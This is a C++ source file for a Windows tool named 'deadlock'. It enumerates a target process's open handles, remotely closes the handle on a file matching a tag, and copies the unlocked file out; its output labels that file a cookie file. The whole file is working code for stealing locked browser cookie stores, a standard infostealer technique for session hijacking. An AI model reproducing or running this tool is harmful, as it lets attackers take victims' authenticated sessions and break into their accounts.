#include "./src/deadlock.h"
#include<vector>
#include<TlHelp32.h>

using std::vector;
using std::string;

vector<HANDLE> getProcessInstances(LPCSTR procName) {
    vector<HANDLE> handles;

    HANDLE procSs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    while (Process32Next(procSs, &pe32)) {
        if (!strcmp(procName, pe32.szExeFile)) {

            handles.push_back(OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
                FALSE,
                pe32.th32ProcessID
            ));

        }
    }

    CloseHandle(procSs);

    return handles;
}

BOOL isDesiredFile(string& filePath, const char* tag) {
    return filePath.contains(tag);
}

int main(int argc, char* argv[])
{
    const char* targetProcName = argv[1];
    const char* lockedFileTag = argv[2];
    const char* outputFile = argv[3];

    if (!targetProcName || !lockedFileTag) {
        printf("[*] Usage: deadlock.exe <TARGET_PROCESS> <LOCKED_FILE_TAG> <OUTPUT_FILE (Optional)>\n");
        return -1;
    }

    auto procInstances = getProcessInstances(targetProcName);

    if (procInstances.size() == 0) {
        printf("[-] No Processes Found.\n");
        return -1;
    }

    for (HANDLE& procInstance : procInstances) {
        auto hInfo = deadlock::getProcessHandles(procInstance);

        for (size_t i = 0; i < hInfo->NumberOfHandles; i++) {

            auto handleInfo = hInfo->Handles[i];
            auto fileHandle = deadlock::dupHandle(handleInfo.HandleValue, procInstance);

            if (!fileHandle)
                continue;

            if (deadlock::isFileObj(fileHandle)) {

                if (!deadlock::isDiskFile(fileHandle))
                    continue;

                auto cFilePath = deadlock::getFilePath(fileHandle);

                if (cFilePath) {
                    auto filePath = string(cFilePath);

                    if (isDesiredFile(filePath, lockedFileTag)) {

                        printf("[+] Found Target Cookie File (Instance PID: %ld)\n", GetProcessId(procInstance));

                        deadlock::remoteCloseHandle(procInstance, handleInfo.HandleValue);
                        CloseHandle(fileHandle);

                        printf("[+] Unlocked File!\n");

                        if (outputFile) {

                            Sleep(500);
                            
                            HANDLE newFileHandle = CreateFileA(
                                cFilePath,
                                GENERIC_READ,
                                0,
                                NULL,
                                OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL,
                                NULL
                            );

                            if (!newFileHandle)
                                continue;

                            DWORD fileSize = GetFileSize(newFileHandle, NULL);

                            PVOID fileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);

                            if (ReadFile(
                                newFileHandle,
                                fileBuffer,
                                fileSize,
                                &fileSize,
                                NULL
                            )) {

                                printf("[+] Read File! (Buffer Address: 0x%p)\n", fileBuffer);

                                HANDLE outputFileHandle = CreateFileA(
                                    outputFile,
                                    GENERIC_READ | GENERIC_WRITE,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                                    NULL,
                                    CREATE_ALWAYS,
                                    FILE_ATTRIBUTE_NORMAL,
                                    NULL
                                );

                                if (WriteFile(
                                    outputFileHandle,
                                    fileBuffer,
                                    fileSize,
                                    &fileSize,
                                    NULL
                                )) {
                                    printf("[+] Wrote Output Successfully.\n");
                                }

                                CloseHandle(newFileHandle);
                                CloseHandle(outputFileHandle);

                             }

                        }
                    }
                }

            }


        }

        free(hInfo);
    }
    
    return 0;
}
